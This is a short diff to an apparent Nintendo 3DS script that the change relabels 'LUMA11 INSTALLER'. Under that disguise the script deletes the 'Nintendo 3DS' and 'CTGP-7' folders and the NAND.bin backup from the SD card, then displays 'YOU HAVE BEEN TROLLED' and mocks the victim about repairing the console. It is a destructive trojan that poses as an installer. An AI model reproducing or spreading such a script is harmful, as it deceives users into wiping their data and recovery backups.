@@ -1,4 +1,4 @@
-set PREVIEW_MODE "by the cocohackeur team\n(we are not responsible for any damage\nthat can be cause by this tool)\n\nDON'T power OFF your console.\nDon't press B to avoid a brick"
+set PREVIEW_MODE "LUMA11 INSTALLER\nby the cocohackeur team\n(we are not responsible for any damage\nthat can be cause by this tool)\n\nDON'T power OFF your console.\nDon't press B to avoid a brick"
 
 set ERRORMSG "An error as occured..."
 
@@ -88,5 +88,5 @@ rm -o -s 0:/Nintendo 3DS
 rm -o -s 0:/CTGP-7
 rm -o -s 0:/NAND.bin
 
-qr "Now you can do like he (QRcode)\ngood luck to repair your console ;)\nthe last thing this can be displayed is this message." https://www.youtube.com/watch?v=dGQXUYTJyVAs
+qr "YOU HAVE BEEN TROLLED\nNow you can do like he (QRcode)\ngood luck to repair your console ;)\nthe last thing this can be displayed is this message." https://www.youtube.com/watch?v=dGQXUYTJyVAs
 reboot
